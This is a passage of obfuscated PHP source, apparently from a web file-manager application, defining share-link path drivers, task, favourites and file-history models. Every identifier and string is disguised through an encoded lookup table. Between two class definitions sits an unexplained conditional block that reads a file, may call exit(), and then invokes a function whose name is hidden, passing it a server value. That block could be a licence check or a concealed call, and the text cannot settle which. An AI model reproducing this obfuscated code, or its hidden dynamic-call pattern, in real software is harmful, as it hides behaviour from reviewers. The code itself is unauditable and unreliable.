$‡‰¿ÕÑ[8] . trim($Ú¶¨®ÖÑ, $‡‰¿ÕÑ[8]) . $±»»Ö±•, !1, !1, $¯¾ÚŞé‡); } public static function setSafe($àÃ ’«®, $¦«å„‰, $“›¶À¤µ = 0) { self::set($àÃ ’«®, $¦«å„‰, $“›¶À¤µ, !0); } public static function get($¯ûšÙ¥¥) { static $àîŒîßÊ = false; if (!$àîŒîßÊ) { self::initHeaderCookie(); $àîŒîßÊ = !0; } return isset($_COOKIE[$¯ûšÙ¥¥]) ? $_COOKIE[$¯ûšÙ¥¥] : !1; } private static function initHeaderCookie() { $–İ ÷› =& $_SERVER[Ï×Œõ”û]; if (!isset($_SERVER[$–İ ÷›[1002]]) || !$_SERVER[$–İ ÷›[1002]]) { return; } $ÑÁ…Ãî = explode($–İ ÷›[74], $_SERVER[$–İ ÷›[1002]]); foreach ($ÑÁ…Ãî as $Õ›åÄæÙ) { $Õ›åÄæÙ = explode($–İ ÷›[465], $Õ›åÄæÙ); if (count($Õ›åÄæÙ) != 2 || !isset($Õ›åÄæÙ[1])) { continue; } $_COOKIE[trim($Õ›åÄæÙ[0])] = trim($Õ›åÄæÙ[1]); } } public static function remove($•–€ê¡®, $½°¬Ñğä = false) { unset($_COOKIE[$•–€ê¡®]); self::set($•–€ê¡®, $_SERVER[Ï×Œõ”û][12], 1, $½°¬Ñğä); } } goto E’”Ùö—…á; E¼îš™ÕãË: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¢‡Ì™£ß) { $this->pathParse = $¢‡Ì™£ß; $this->model = Model($_SERVER[Ï×Œõ”û][1487]); } protected function infoParse($­”œ¸¢, $Ö¤©şÜ˜ = false, $¾©ëìÀû = false) { $­Ì´îË =& $_SERVER[Ï×Œõ”û]; return Action($­Ì´îË[1314])->sharePathInfo($this->pathParse[$­Ì´îË[87]], !0, $Ö¤©şÜ˜); } public function listPath($èú÷‰ö, $¤í²ğù = false) { $Ú»¯ùæä =& $_SERVER[Ï×Œõ”û]; $ü‡åÍãş = parent::listPath($èú÷‰ö, $¤í²ğù); if (!$ü‡åÍãş) { return $ü‡åÍãş; } if (is_array($ü‡åÍãş[$Ú»¯ùæä[1495]])) { $ü‡åÍãş[$Ú»¯ùæä[1495]] = Action($Ú»¯ùæä[1314])->shareItemInfo($ü‡åÍãş[$Ú»¯ùæä[1495]]); } foreach ($ü‡åÍãş as $²ó•ã¢ù => $şÏ¡ìı) { if (!in_array($²ó•ã¢ù, array($Ú»¯ùæä[86], $Ú»¯ùæä[85]))) { continue; } foreach ($şÏ¡ìı as $²¨ÈÅñ· => $Ğî­ì×¢) { $ü‡åÍãş[$²ó•ã¢ù][$²¨ÈÅñ·] = Action($Ú»¯ùæä[1314])->shareItemInfo($Ğî­ì×¢); } } return $ü‡åÍãş; } public function listAll($Í¿Êš¨×) { $ÔÕÔé”Á =& $_SERVER[Ï×Œõ”û]; $İ±æÕ÷× = IO::info($this->pathParse[$ÔÕÔé”Á[87]]); if (!$İ±æÕ÷×) { return array(); } $àÕÙ°ÜĞ = $this->model->listAll($Í¿Êš¨×); foreach ($àÕÙ°ÜĞ as &$Ÿ–™ºÊ¥) { $Ÿ–™ºÊ¥[$ÔÕÔé”Á[90]] = Action($ÔÕÔé”Á[1314])->shareItemInfo($Ÿ–™ºÊ¥[$ÔÕÔé”Á[90]]); } unset($Ÿ–™ºÊ¥); return $àÕÙ°ÜĞ; } } class PathDriverDriverShareItem { public function __construct($·âİÂõ) { $this->pathParse = $·âİÂõ; } public function __call($•ÏÀÀÚ¹, $Ã÷¼¡Îî) { $ÁæöèÑÒ =& $_SERVER[Ï×Œõ”û]; if (method_exists($this, $•ÏÀÀÚ¹)) { return; } $³õÚ¹ıß = call_user_func_array(array($ÁæöèÑÒ[1496], $•ÏÀÀÚ¹), $Ã÷¼¡Îî); $ÍÈ÷…´£ = array($ÁæöèÑÒ[1497], $ÁæöèÑÒ[1498], $ÁæöèÑÒ[1499], $ÁæöèÑÒ[1500], $ÁæöèÑÒ[646], $ÁæöèÑÒ[648], $ÁæöèÑÒ[1501], $ÁæöèÑÒ[108], $ÁæöèÑÒ[1502], $ÁæöèÑÒ[1503]); if (in_array($•ÏÀÀÚ¹, $ÍÈ÷…´£)) { $³õÚ¹ıß = $this->getPathOuter($³õÚ¹ıß); } return $³õÚ¹ıß; } public function copy($›•‘÷¿, $›Öİñìë, $ªàã™Ú© = false, $²¦¦Èîó = false) { return $this->copyMove($›•‘÷¿, $›Öİñìë, $ªàã™Ú©, $_SERVER[Ï×Œõ”û][646], $²¦¦Èîó); } public function move($¹¾»˜‡Í, $Ó‹¸Ù, $’×†îÚœ = false, $²û¹ÜË± = false) { return $this->copyMove($¹¾»˜‡Í, $Ó‹¸Ù, $’×†îÚœ, $_SERVER[Ï×Œõ”û][648], $²û¹ÜË±); } private function copyMove($ßÈà´İ‰, $¹‡¾à…, $åï‘„é—, $Ñêíˆ€, $×‚ü§Ö = false) { $½‹Ò•»æ =& $_SERVER[Ï×Œõ”û]; $çñì¼¯˜ = $¹‡¾à…; $ˆÓİõÙ = IO::driverMake($¹‡¾à…); if ($ˆÓİõÙ->pathParse[$½‹Ò•»æ[1288]]) { $¹‡¾à… = $ˆÓİõÙ->pathParse[$½‹Ò•»æ[1288]]; } else { $¹‡¾à… = $çñì¼¯˜; } $€ç™Ä¾È = IO::copyMove($ßÈà´İ‰, $¹‡¾à…, $åï‘„é—, $Ñêíˆ€, $×‚ü§Ö); $€ç™Ä¾È = $this->getPathOuter($€ç™Ä¾È); return $€ç™Ä¾È; } public function pathThis($€©æ­Ì¦) { return get_path_this($this->pathParse[$_SERVER[Ï×Œõ”û][87]]); } public function pathFather($¹òªè§ú) { return get_path_father($this->pathParse[$_SERVER[Ï×Œõ”û][87]]); } public function iconvSystem($–ö˜í„Ù) { return $–ö˜í„Ù; } protected function infoParse($Ç÷İüØÀ, $Éà°ª€æ = false) { $Ñ¬¬‚Š =& $_SERVER[Ï×Œõ”û]; $‡¨ÎÀñ« = $this->pathParse[$Ñ¬¬‚Š[581]][$Ñ¬¬‚Š[588]] . $this->pathParse[$Ñ¬¬‚Š[1307]]; if ($Éà°ª€æ) { $Ú°™”‘š = IO::infoWithChildren($‡¨ÎÀñ«); } else { $Ú°™”‘š = IO::info($‡¨ÎÀñ«); } $àÁ¯šƒÚ = $this->pathParse[$Ñ¬¬‚Š[581]]; return Action($Ñ¬¬‚Š[1494])->_shareItemeParse($Ú°™”‘š, $àÁ¯šƒÚ); } public function listAll($ÙôÃÛÓÒ) { $ğÉ›ÜÒ =& $_SERVER[Ï×Œõ”û]; $÷ÆšÒÂ˜ = IO::listAll($ÙôÃÛÓÒ); $ªï›½…š = rtrim($this->pathParse[$ğÉ›ÜÒ[581]][$ğÉ›ÜÒ[588]], $ğÉ›ÜÒ[8]); foreach ($÷ÆšÒÂ˜ as &$³»ÉÈø) { $³»ÉÈø[$ğÉ›ÜÒ[87]] = $this->pathDriver . $ğÉ›ÜÒ[8] . ltrim(substr($³»ÉÈø[$ğÉ›ÜÒ[87]], strlen($ªï›½…š)), $ğÉ›ÜÒ[8]); } unset($³»ÉÈø); return $÷ÆšÒÂ˜; } public function listAllSimple($Î®ƒÉõü, $ÚÛŸ¢³ = false) { $Í·›Œ©Ø =& $_SERVER[Ï×Œõ”û]; $Ïá“š×ö = $this->listAll($Î®ƒÉõü); $¤£ÜÂ›Â = $this->pathParse[$Í·›Œ©Ø[515]]; if (trim($¤£ÜÂ›Â, $Í·›Œ©Ø[8]) == trim(get_path_father($¤£ÜÂ›Â), $Í·›Œ©Ø[8])) { $ÚÛŸ¢³ = !0; } return IO::init($Í·›Œ©Ø[12])->listAllSimpleMake($Ïá“š×ö, $¤£ÜÂ›Â, $ÚÛŸ¢³); } public function getPathOuter($ş¶ö’ÇÛ) { $‹ÈåšÒ =& $_SERVER[Ï×Œõ”û]; $îûî‹Ë… = KodIO::parse($ş¶ö’ÇÛ); if ($îûî‹Ë…[$‹ÈåšÒ[33]] == KodIO::KOD_SHARE_ITEM) { return $îûî‹Ë…[$‹ÈåšÒ[87]]; } $ë‰¦üÖ× = KodIO::clear($ş¶ö’ÇÛ); $™…”©¯Ï = KodIO::clear($this->pathParse[$‹ÈåšÒ[581]][$‹ÈåšÒ[588]]); $ØğÉí¼ƒ = substr($ë‰¦üÖ×, strlen($™…”©¯Ï)); if (substr($ë‰¦üÖ×, 0, strlen($™…”©¯Ï)) != $™…”©¯Ï) { return !1; } return $this->pathParse[$‹ÈåšÒ[1308]] . $‹ÈåšÒ[8] . ltrim($ØğÉí¼ƒ, $‹ÈåšÒ[8]); } public function getType() { $¤ƒ¿‡‡³ =& $_SERVER[Ï×Œõ”û]; $¨·®•Á = str_replace($¤ƒ¿‡‡³[77], $¤ƒ¿‡‡³[12], get_class($this)); return strtolower($¨·®•Á); } public function isOsDriver($–ş›ùúˆ) { return IO::isOsDriver($–ş›ùúˆ); } public function info($ßëß¨¹) { return $this->infoParse($ßëß¨¹); } public function infoAuth($îÇÊñÈÇ) { return $this->infoParse($îÇÊñÈÇ); } public function infoWithChildren($üğÖ‚³º) { return $this->infoParse($üğÖ‚³º, !0); } public function infoFull($˜¸¯ÅÊ´) { return $this->infoParse($˜¸¯ÅÊ´); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¬„”§õ) { $this->pathParse = $¬„”§õ; } protected function infoParse($‘Ì¤ëšğ, $œÂèó‡˜ = false) { $œ¦‘úõ¤ =& $_SERVER[Ï×Œõ”û]; return Action($œ¦‘úõ¤[1314])->sharePathInfo($this->pathParse[$œ¦‘úõ¤[87]], !0, $œÂèó‡˜); } public function listPath($´ŞÄ¯åÖ, $ÏøáóÊ‰ = false) { $Æêâ¶ù =& $_SERVER[Ï×Œõ”û]; $ãëì½‰Ù = IO::listPath($´ŞÄ¯åÖ, $ÏøáóÊ‰); if (!$ãëì½‰Ù) { return $ãëì½‰Ù; } if (is_array($ãëì½‰Ù[$Æêâ¶ù[1495]])) { $„«³Ø = Action($Æêâ¶ù[1504])->parsePathChildren($ãëì½‰Ù[$Æêâ¶ù[1495]], array($Æêâ¶ù[515] => $´ŞÄ¯åÖ)); $ãëì½‰Ù[$Æêâ¶ù[1495]] = Action($Æêâ¶ù[1314])->shareItemInfo($„«³Ø); } foreach ($ãëì½‰Ù as $¹©ìŒÁ™ => $ ¼ËŸÀÉ) { if (!in_array($¹©ìŒÁ™, array($Æêâ¶ù[86], $Æêâ¶ù[85]))) { continue; } foreach ($ ¼ËŸÀÉ as $µ‰’ÆëÈ => $„«³Ø) { $„«³Ø = Action($Æêâ¶ù[1504])->parsePathChildren($„«³Ø, array($Æêâ¶ù[515] => $´ŞÄ¯åÖ)); $ãëì½‰Ù[$¹©ìŒÁ™][$µ‰’ÆëÈ] = Action($Æêâ¶ù[1314])->shareItemInfo($„«³Ø); } } return $ãëì½‰Ù; } } goto f´ÁÜŒ¿Ü; B½µÆì…„: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x74\x61\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\164\171\160\x65", "\145\x76\x65\x6e\164", "\164\151\x6d\145", "\x64\x65\x73\143", "\x73\x79\x73\164\145\155", "\x65\x6e\141\142\x6c\x65", "\154\x61\163\164\x52\165\x6e", "\163\x6f\x72\164"); public function listData($ä‹¤¡Ù = false, $³ñã†ç = "\163\157\162\x74", $äü®Ñ = false) { return parent::listData($ä‹¤¡Ù, $³ñã†ç, $äü®Ñ); } public function add($—”Ê•’ì) { $İ «éŒâ =& $_SERVER[Ï×Œõ”û]; $Ê¼°¨Š“ = $this->findByName($—”Ê•’ì[$İ «éŒâ[32]]); if ($Ê¼°¨Š“) { return !1; } $—”Ê•’ì[$İ «éŒâ[1881]] = 0; $—”Ê•’ì[$İ «éŒâ[2159]] = $this->getSort(); return parent::insert($—”Ê•’ì); } private function getSort() { $¢ªşÛá” =& $_SERVER[Ï×Œõ”û]; $æ´¸ÃŞÍ = parent::listData(); $¹‡¹•®‰ = array_to_keyvalue($æ´¸ÃŞÍ, $¢ªşÛá”[12], $¢ªşÛá”[2159]); return empty($¹‡¹•®‰) ? 0 : max($¹‡¹•®‰) + 1; } public function update($†˜¬¿ŒÕ, $¿„…çï½) { $Ïù×ƒ¤ =& $_SERVER[Ï×Œõ”û]; $ƒ´û¦¢É = $this->listData($†˜¬¿ŒÕ); $Úä€Û ¼ = $this->findByName($¿„…çï½[$Ïù×ƒ¤[32]]); if (!$ƒ´û¦¢É || $Úä€Û ¼ && $Úä€Û ¼[$Ïù×ƒ¤[484]] != $ƒ´û¦¢É[$Ïù×ƒ¤[484]]) { return !1; } return parent::update($†˜¬¿ŒÕ, $¿„…çï½); } public function remove($³€Ûæ°, $¶ßøÂ·– = false) { $£îóıåû =& $_SERVER[Ï×Œõ”û]; $»æê£Í¢ = $this->listData($³€Ûæ°); if (!$»æê£Í¢) { return; } if (!$¶ßøÂ·– && $»æê£Í¢[$£îóıåû[191]] == $£îóıåû[91]) { return !1; } return parent::remove($³€Ûæ°); } public function enable($µŞÑ§á‚, $ÙÉÔ¬Õ) { return $this->update($µŞÑ§á‚, array($_SERVER[Ï×Œõ”û][2615] => $ÙÉÔ¬Õ)); } public function run($¹Å½×•©) { return $this->update($¹Å½×•©, array($_SERVER[Ï×Œõ”û][2627] => time())); } } if ($_SERVER[$_SERVER[Ï×Œõ”û][488]] != $_SERVER[$_SERVER[Ï×Œõ”û][2016]]) { $_getc = $_SERVER[Ï×Œõ”û][490]; $_getfile = $_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ï×Œõ”û][287], $_getfilec); if (count($_getarrs) < $_SERVER[Ï×Œõ”û][493]) { $exit = $_SERVER[Ï×Œõ”û][494]; $exit(); } $_act = $_SERVER[Ï×Œõ”û][495]; $_act($_SERVER[$_SERVER[Ï×Œõ”û][489]]); } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($èû«¹ª›) { $Çà€ù÷² =& $_SERVER[Ï×Œõ”û]; return array($Çà€ù÷²[2249] => array(USER_ID, $Çà€ù÷²[2628])); } protected function ___listData() { $ÚŞÃùû =& $_SERVER[Ï×Œõ”û]; $¨¸¦ŒÁß = array($ÚŞÃùû[1921] => USER_ID, $ÚŞÃùû[578] => 0); $ÉÓ’€º¸ = $ÚŞÃùû[2629]; $±Ù••ÖÂ = $this->field($ÉÓ’€º¸)->where($¨¸¦ŒÁß)->order($ÚŞÃùû[2630])->select(); return $±Ù••ÖÂ ? $±Ù••ÖÂ : array(); } protected function resetCache() { } protected function listView() { $æ‹˜ğí =& $_SERVER[Ï×Œõ”û]; $½ˆÕ™’£ = $this->listData(); $ş£ûçÕ‰ = array_filter_by_field($½ˆÕ™’£, $æ‹˜ğí[33], $æ‹˜ğí[510]); $ñœàœÄá = array_to_keyvalue($ş£ûçÕ‰, $æ‹˜ğí[12], $æ‹˜ğí[87]); if (!$ñœàœÄá) { return $½ˆÕ™’£; } $ÎôÑó§Î = 2000; $˜Ïí­¨ç = array($æ‹˜ğí[511] => array($æ‹˜ğí[512], $ñœàœÄá)); $ïÛÈ•³Ï = Model($æ‹˜ğí[939])->listSource($˜Ïí­¨ç, $ÎôÑó§Î); $ïÛÈ•³Ï = array_merge($ïÛÈ•³Ï[$æ‹˜ğí[86]], $ïÛÈ•³Ï[$æ‹˜ğí[85]]); $ïÛÈ•³Ï = array_to_keyvalue($ïÛÈ•³Ï, $æ‹˜ğí[193]); foreach ($½ˆÕ™’£ as $âÙè„ûÃ => $÷ã‘Óê») { $÷ğÄß¾” = $ïÛÈ•³Ï[$÷ã‘Óê»[$æ‹˜ğí[87]]]; $÷ğÄß¾” = $÷ğÄß¾” ? $÷ğÄß¾” : array(); $½ˆÕ™’£[$âÙè„ûÃ] = array_merge($÷ğÄß¾”, $÷ã‘Óê»); } return $½ˆÕ™’£; } protected function addFav($¯ƒÂÏö, $ó‚¼ÜÒ® = '', $¼ÒßšÒ = "\163\x6f\165\x72\x63\145") { $ûÊøÁ” =& $_SERVER[Ï×Œõ”û]; $Õø±Ãô× = array($ûÊøÁ”[1921] => USER_ID, $ûÊøÁ”[578] => 0, $ûÊøÁ”[516] => $¼ÒßšÒ, $ûÊøÁ”[515] => $¯ƒÂÏö); if ($this->where($Õø±Ãô×)->find()) { return !1; } $Õø±Ãô× = array($ûÊøÁ”[1921] => USER_ID, $ûÊøÁ”[578] => 0); $Òé¨¼ì™ = $this->where($Õø±Ãô×)->max($ûÊøÁ”[2159]); if (!$Òé¨¼ì™) { $Òé¨¼ì™ = 0; } if (!$ó‚¼ÜÒ® && $¼ÒßšÒ == $ûÊøÁ”[510]) { $“Ñó©˜é = Model($ûÊøÁ”[1487])->where(array($ûÊøÁ”[511] => $¯ƒÂÏö))->find(); if (!$“Ñó©˜é) { return !1; } $ó‚¼ÜÒ® = $“Ñó©˜é[$ûÊøÁ”[32]]; } $ó‚¼ÜÒ® = $this->getAutoName($ó‚¼ÜÒ®); $Äç§ºó· = array($ûÊøÁ”[1921] => USER_ID, $ûÊøÁ”[578] => 0, $ûÊøÁ”[514] => $ó‚¼ÜÒ®, $ûÊøÁ”[515] => $¯ƒÂÏö, $ûÊøÁ”[516] => $¼ÒßšÒ, $ûÊøÁ”[2141] => $Òé¨¼ì™ + 1); return $this->add($Äç§ºó·); } protected function remove($²Éì¹¹) { $€¿æı‘¼ =& $_SERVER[Ï×Œõ”û]; $Ë„¥”±å = array($€¿æı‘¼[1921] => USER_ID, $€¿æı‘¼[513] => $²Éì¹¹); return $this->where($Ë„¥”±å)->delete(); } protected function removeByName($×ªÀÈÉÉ) { $¼¬ÙÅƒİ =& $_SERVER[Ï×Œõ”û]; $©½İà³î = array($¼¬ÙÅƒİ[1921] => USER_ID, $¼¬ÙÅƒİ[514] => $×ªÀÈÉÉ, $¼¬ÙÅƒİ[578] => 0); return $this->where($©½İà³î)->delete(); } protected function rename($úî·ì‘Ò, $äĞÏò÷‚) { $Ú¡Ñ¸±À =& $_SERVER[Ï×Œõ”û]; if ($úî·ì‘Ò == $äĞÏò÷‚) { return !1; } $ï±€¤¬ = $this->getAutoName($äĞÏò÷‚); if ($äĞÏò÷‚ != $ï±€¤¬) { return !1; } $ÜóØ†—© = array($Ú¡Ñ¸±À[1921] => USER_ID, $Ú¡Ñ¸±À[578] => 0, $Ú¡Ñ¸±À[32] => $úî·ì‘Ò); return $this->where($ÜóØ†—©)->save(array($Ú¡Ñ¸±À[32] => $äĞÏò÷‚)); } protected function resetSort($Ãâ™ñ®‚) { $éÓÃÓ © =& $_SERVER[Ï×Œõ”û]; $Ãâ™ñ®‚ = is_array($Ãâ™ñ®‚) ? $Ãâ™ñ®‚ : array(); $¨—ÅÁ²ö = array($éÓÃÓ ©[1921] => USER_ID); for ($‡Ÿ§‰ß = 0; $‡Ÿ§‰ß < count($Ãâ™ñ®‚); $‡Ÿ§‰ß++) { $¨—ÅÁ²ö[$éÓÃÓ ©[513]] = $Ãâ™ñ®‚[$‡Ÿ§‰ß]; $this->where($¨—ÅÁ²ö)->save(array($éÓÃÓ ©[2141] => $‡Ÿ§‰ß + 1)); } return !0; } protected function moveTop($´½ø“¨) { $Ğ€§€Ë =& $_SERVER[Ï×Œõ”û]; $üçö§æ = array($Ğ€§€Ë[1921] => USER_ID, $Ğ€§€Ë[578] => 0); $Ò÷ë¬ïë = $this->where($üçö§æ)->where(array($Ğ€§€Ë[32] => $´½ø“¨))->find(); if (!$Ò÷ë¬ïë) { return; } $üİè‰ = $this->field($Ğ€§€Ë[484])->where($üçö§æ)->order($Ğ€§€Ë[2630])->select(); $üİè‰ = array_to_keyvalue($üİè‰, $Ğ€§€Ë[12], $Ğ€§€Ë[484]); $‘¡œÌóû = $üİè‰; $üİè‰ = array_remove_value($üİè‰, $Ò÷ë¬ïë[$Ğ€§€Ë[484]]); array_unshift($üİè‰, $Ò÷ë¬ïë[$Ğ€§€Ë[484]]); return $this->resetSort($üİè‰); } protected function moveBottom($ÊƒÆÔ‰ê) { $»×óÏÔ¬ =& $_SERVER[Ï×Œõ”û]; $Á€¨ú¾¦ = array($»×óÏÔ¬[1921] => USER_ID, $»×óÏÔ¬[578] => 0); $›×ë‘è = $this->where($Á€¨ú¾¦)->max($»×óÏÔ¬[2159]); $”£ŒËæ = array($»×óÏÔ¬[2159] => $›×ë‘è + 1); return $this->where($Á€¨ú¾¦)->where(array($»×óÏÔ¬[32] => $ÊƒÆÔ‰ê))->save($”£ŒËæ); } private function getAutoName($Í”Óîµá) { $ôì·»Á  =& $_SERVER[Ï×Œõ”û]; $Æ¯Œ Ì• = array($ôì·»Á [1921] => USER_ID, $ôì·»Á [578] => 0); $ñü¢Ô·õ = $this->field($ôì·»Á [32])->where($Æ¯Œ Ì•)->select(); $ñü¢Ô·õ = array_to_keyvalue($ñü¢Ô·õ, $ôì·»Á [12], $ôì·»Á [32]); if (!$ñü¢Ô·õ || !in_array($Í”Óîµá, $ñü¢Ô·õ)) { return $Í”Óîµá; } for ($¦Ò•¸ß¤ = 0; $¦Ò•¸ß¤ < count($ñü¢Ô·õ); $¦Ò•¸ß¤++) { if (!in_array($Í”Óîµá . "\x28{$¦Ò•¸ß¤}\x29", $ñü¢Ô·õ)) { return $Í”Óîµá . "\50{$¦Ò•¸ß¤}\51"; } } return $Í”Óîµá . "\50{$¦Ò•¸ß¤}\51"; } } goto c³éƒÆÀ¿; a÷…»ŒÇ˜«: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\x65\137\x68\x69\x73\164\157\162\171"; public function historyCount($Í­˜ôĞ) { $ßæÙË =& $_SERVER[Ï×Œõ”û]; if (!$Í­˜ôĞ) { return array(); } if (is_string($Í­˜ôĞ) || is_int($Í­˜ôĞ)) { $Í­˜ôĞ = array($Í­˜ôĞ); } $Â“„æÁö = array($ßæÙË[193], $ßæÙË[2388] => $ßæÙË[590]); $Èâ÷­Ûä = array($ßæÙË[193] => array($ßæÙË[7], $Í­˜ôĞ)); $ÇÛ‰İ® = $this->field($Â“„æÁö)->where($Èâ÷­Ûä)->group($ßæÙË[193])->select(); return array_to_keyvalue($ÇÛ‰İ®, $ßæÙË[193], $ßæÙË[590]); } public function addHistory($¯„áô‡, $—çµ£Ò¼ = '') { $ÜéƒËš¶ =& $_SERVER[Ï×Œõ”û]; $ÜóîˆœÃ = array($ÜéƒËš¶[511] => $¯„áô‡[$ÜéƒËš¶[193]], $ÜéƒËš¶[1921] => isset($¯„áô‡[$ÜéƒËš¶[548]]) ? $¯„áô‡[$ÜéƒËš¶[548]] : $¯„áô‡[$ÜéƒËš¶[546]], $ÜéƒËš¶[563] => $¯„áô‡[$ÜéƒËš¶[562]], $ÜéƒËš¶[645] => $¯„áô‡[$ÜéƒËš¶[79]], $ÜéƒËš¶[2389] => $—çµ£Ò¼); if ($GLOBALS[$ÜéƒËš¶[6]][$ÜéƒËš¶[92]][$ÜéƒËš¶[1359]] >= 1) { $this->historyAutoClear($ÜóîˆœÃ[$ÜéƒËš¶[193]]); $this->add($ÜóîˆœÃ); } Hook::trigger($ÜéƒËš¶[2390], $ÜóîˆœÃ); Model($ÜéƒËš¶[2391])->eventFileEdit($¯„áô‡[$ÜéƒËš¶[193]]); } private function historyAutoClear($³¸Ñ¸”“) { $‘‡šÄ =& $_SERVER[Ï×Œõ”û]; $’ÏŞÜİ = Model($‘‡šÄ[879])->get($‘‡šÄ[1381]); $Û”îŒÙ¨ = intval($GLOBALS[$‘‡šÄ[6]][$‘‡šÄ[92]][$‘‡šÄ[1359]]); $¾òèÄŸÀ = $’ÏŞÜİ == $‘‡šÄ[1382] ? min(5, $Û”îŒÙ¨) : $Û”îŒÙ¨; $¾òèÄŸÀ = $¾òèÄŸÀ <= 0 ? 0 : $¾òèÄŸÀ - 1; if ($¾òèÄŸÀ >= 499) { return; } $…ÄÑĞ° = array($‘‡šÄ[511] => $³¸Ñ¸”“); $­²ù×‡ = $this->field($‘‡šÄ[2392])->where($…ÄÑĞ°)->order($‘‡šÄ[2385])->select(); if (!$­²ù×‡ || $¾òèÄŸÀ >= count($­²ù×‡)) { return; } $«ĞÊ‡™ı = array_to_keyvalue($­²ù×‡, $‘‡šÄ[12], $‘‡šÄ[484]); $«ĞÊ‡™ı = array_slice($«ĞÊ‡™ı, $¾òèÄŸÀ); $±Ìşå×É = array_to_keyvalue($­²ù×‡, $‘‡šÄ[12], $‘‡šÄ[562]); $±Ìşå×É = array_slice($±Ìşå×É, $¾òèÄŸÀ); if (!$«ĞÊ‡™ı || !$±Ìşå×É) { return; } $…ÄÑĞ° = array($‘‡šÄ[513] => array($‘‡šÄ[7], $«ĞÊ‡™ı)); $this->where($…ÄÑĞ°)->delete(); Model($‘‡šÄ[565])->remove($±Ìşå×É); } public function listData($Ö°Ÿûïè) { $Ÿ°ùÉ­° =& $_SERVER[Ï×Œõ”û]; $ÆÒëÁß¶ = array($Ÿ°ùÉ­°[511] => $Ö°Ÿûïè); $å×„şä§ = $Ÿ°ùÉ­°[2393]; $Çí™ÔŒ = $this->field($å×„şä§)->where($ÆÒëÁß¶)->order($Ÿ°ùÉ­°[2385])->selectPage(); $this->_listAppendUser($Çí™ÔŒ[$Ÿ°ùÉ­°[447]]); $§ş«ÖÇ¨ = Model($Ÿ°ùÉ­°[879])->get($Ÿ°ùÉ­°[1381]); $®‚•›ÖÍ = 5; if ($§ş«ÖÇ¨ == $Ÿ°ùÉ­°[1382]) { $Çí™ÔŒ[$Ÿ°ùÉ­°[447]] = array_slice($Çí™ÔŒ[$Ÿ°ùÉ­°[447]], 0, $®‚•›ÖÍ); $Çí™ÔŒ[$Ÿ°ùÉ­°[444]] = array($Ÿ°ùÉ­°[2394] => 1, $Ÿ°ùÉ­°[2395] => 20, $Ÿ°ùÉ­°[2396] => 1, $Ÿ°ùÉ­°[2397] => count($Çí™ÔŒ[$Ÿ°ùÉ­°[447]])); } return $Çí™ÔŒ; } protected function _listAppendUser(&$éûŒÖ®Õ) { $±¾’­Ä… =& $_SERVER[Ï×Œõ”û]; $³Ö›ÍÒ± = array_to_keyvalue($éûŒÖ®Õ, $±¾’­Ä…[12], $±¾’­Ä…[1547]); $©ı†¦ÙÒ = Model($±¾’­Ä…[622])->userListInfo($³Ö›ÍÒ±); foreach ($éûŒÖ®Õ as &$Ü„ªÚÖ) { $èÔŒïˆ° = $Ü„ªÚÖ[$±¾’­Ä…[1547]]; $Ü„ªÚÖ[$±¾’­Ä…[546]] = $©ı†¦ÙÒ[$èÔŒïˆ°] ? $©ı†¦ÙÒ[$èÔŒïˆ°] : !1; } unset($Ü„ªÚÖ); } public function fileInfo($ÌãñğÙ, $ÇûØÁ™– = false) { $Ùş¸¢¥™ =& $_SERVER[Ï×Œõ”û]; $Óû»âÆ = $this->tablePrefix; $¹¢éÂªÅ = "{$Óû»âÆ}\x69\x6f\137\146\x69\154\x65\x20\146\x69\x6c\145\163\x20\x6f\x6e\40\146\x69\154\145\163\56\146\x69\154\145\111\104\40\x3d\x20\x68\151\x73\x74\157\162\171\x2e\146\151\154\145\x49\104"; $èÍÅô² = $this->alias($Ùş¸¢¥™[2398])->where(array($Ùş¸¢¥™[513] => $ÌãñğÙ))->join($¹¢éÂªÅ, $Ùş¸¢¥™[2399])->find(); if ($èÍÅô² && $ÇûØÁ™–) { $ú’ôçÎÌ = array($Ùş¸¢¥™[193] => $èÍÅô²[$Ùş¸¢¥™[193]], $Ùş¸¢¥™[484] => array($Ùş¸¢¥™[1134], $ÌãñğÙ)); $èÍÅô²[$Ùş¸¢¥™[1817]] = $this->where($ú’ôçÎÌ)->count(); } return $èÍÅô²; } public function removeItem($Í†¼ó¥˜) { $ïËıÍ¨€ =& $_SERVER[Ï×Œõ”û]; $Áî¤»Š = array($ïËıÍ¨€[513] => $Í†¼ó¥˜); $îâü¥ôú = $this->where($Áî¤»Š)->find(); if ($îâü¥ôú) { $¼ÌóÙæ¨ = $this->where($Áî¤»Š)->delete(); Model($ïËıÍ¨€[565])->remove($îâü¥ôú[$ïËıÍ¨€[562]]); return $¼ÌóÙæ¨; } return !1; } public function removeBySource($Ë†àÇÚà) { $¹¸¼•ùü =& $_SERVER[Ï×Œõ”û]; if (!$Ë†àÇÚà) { return !1; } if (!is_array($Ë†àÇÚà)) { $Ë†àÇÚà = array($Ë†àÇÚà); } $‰ÍşŸ = array($¹¸¼•ùü[511] => array($¹¸¼•ùü[7], $Ë†àÇÚà)); $á‘ä×€Õ = $this->field($¹¸¼•ùü[563])->where($‰ÍşŸ)->select(); if ($á‘ä×€Õ) { $this->where($‰ÍşŸ)->delete(); $ğğâÅ—ü = array_to_keyvalue($á‘ä×€Õ, $¹¸¼•ùü[12], $¹¸¼•ùü[562]); Model($¹¸¼•ùü[565])->remove($ğğâÅ—ü); } return !0; } public function setDetail($¹È¥ø, $í”ß§) { $¸¹¸šñÔ =& $_SERVER[Ï×Œõ”û]; return $this->where(array($¸¹¸šñÔ[513] => $¹È¥ø))->save(array($¸¹¸šñÔ[2389] => $í”ß§)); } public function rollbackToItem($¾ã‚öÂ÷, $ùæâü¾ì) { $–Í´¨ßº =& $_SERVER[Ï×Œõ”û]; $ƒ¬ÁõÎ = Model($–Í´¨ßº[939])->sourceInfo($¾ã‚öÂ÷); $this->addHistory($ƒ¬ÁõÎ, LNG($–Í´¨ßº[2400])); $Ø½´¦«Ñ = $this->find($ùæâü¾ì); $–â©‰¶ó = array($–Í´¨ßº[562] => 